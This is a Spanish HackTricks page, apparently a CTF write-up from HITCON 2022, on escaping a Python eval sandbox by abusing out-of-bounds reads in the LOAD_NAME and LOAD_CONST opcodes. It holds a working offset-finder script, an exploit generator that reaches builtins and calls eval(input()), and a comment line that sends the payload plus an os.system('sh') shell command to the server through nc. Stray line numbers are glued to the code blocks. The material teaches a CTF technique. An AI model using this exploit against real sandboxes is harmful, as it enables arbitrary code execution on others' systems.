# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Esta información fue tomada** [**de este informe**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Podemos usar la función de lectura OOB en el opcode LOAD_NAME / LOAD_CONST para obtener algún símbolo en la memoria. Lo que significa usar trucos como `(a, b, c, ... cientos de símbolos ..., __getattribute__) if [] else [].__getattribute__(...)` para obtener un símbolo (como el nombre de una función) que desees.

Luego solo elabora tu exploit.

### Overview <a href="#overview-1" id="overview-1"></a>

¡El código fuente es bastante corto, solo contiene 4 líneas!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Puedes introducir código Python arbitrario, y se compilará en un [objeto de código Python](https://docs.python.org/3/c-api/code.html). Sin embargo, `co_consts` y `co_names` de ese objeto de código serán reemplazados por una tupla vacía antes de evaluar ese objeto de código.

De esta manera, todas las expresiones que contienen constantes (por ejemplo, números, cadenas, etc.) o nombres (por ejemplo, variables, funciones) podrían causar un fallo de segmentación al final.

### Lectura Fuera de Límites <a href="#out-of-bound-read" id="out-of-bound-read"></a>

¿Cómo ocurre el fallo de segmentación?

Comencemos con un ejemplo simple, `[a, b, c]` podría compilarse en el siguiente bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Pero, ¿qué pasa si el `co_names` se convierte en una tupla vacía? El opcode `LOAD_NAME 2` aún se ejecuta y trata de leer el valor de esa dirección de memoria de la que originalmente debería ser. Sí, esta es una "característica" de lectura fuera de límites.

El concepto central para la solución es simple. Algunos opcodes en CPython, por ejemplo `LOAD_NAME` y `LOAD_CONST`, son vulnerables (?) a la lectura fuera de límites.

Recuperan un objeto del índice `oparg` de la tupla `consts` o `names` (así es como se llaman `co_consts` y `co_names` internamente). Podemos referirnos al siguiente breve fragmento sobre `LOAD_CONST` para ver qué hace CPython cuando procesa el opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
De esta manera, podemos usar la función OOB para obtener un "nombre" de un desplazamiento de memoria arbitrario. Para asegurarnos de qué nombre tiene y cuál es su desplazamiento, simplemente sigue intentando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Y podrías encontrar algo en aproximadamente oparg > 700. También puedes intentar usar gdb para observar el diseño de la memoria, por supuesto, pero no creo que sea más fácil.

### Generando el Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una vez que recuperamos esos desplazamientos útiles para nombres / consts, ¿cómo _obtenemos_ un nombre / const de ese desplazamiento y lo usamos? Aquí hay un truco para ti:\
Supongamos que podemos obtener un nombre `__getattribute__` del desplazamiento 5 (`LOAD_NAME 5`) con `co_names=()`, entonces simplemente haz lo siguiente:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Tenga en cuenta que no es necesario nombrarlo como `__getattribute__`, puede nombrarlo como algo más corto o más extraño

Puede entender la razón detrás de esto simplemente viendo su bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Nota que `LOAD_ATTR` también recupera el nombre de `co_names`. Python carga nombres desde el mismo desplazamiento si el nombre es el mismo, por lo que el segundo `__getattribute__` todavía se carga desde offset=5. Usando esta característica, podemos usar un nombre arbitrario una vez que el nombre está en la memoria cercana.

Para generar números debería ser trivial:

- 0: no \[\[]]
- 1: no \[]
- 2: (no \[]) + (no \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

No utilicé consts debido al límite de longitud.

Primero, aquí hay un script para que encontremos esos desplazamientos de nombres.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Y lo siguiente es para generar el verdadero exploit de Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Básicamente hace lo siguiente, para esas cadenas las obtenemos del método `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{{#include ../../../banners/hacktricks-training.md}}
